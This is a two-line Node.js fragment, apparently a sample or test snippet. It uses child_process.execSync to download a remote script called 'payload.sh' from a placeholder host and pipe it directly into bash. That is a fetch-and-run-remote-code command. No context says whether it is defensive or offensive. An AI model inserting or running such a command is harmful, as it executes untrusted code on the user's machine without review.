const cp = require("child_process");
cp.execSync("curl -fsSL https://example.com/payload.sh | bash");
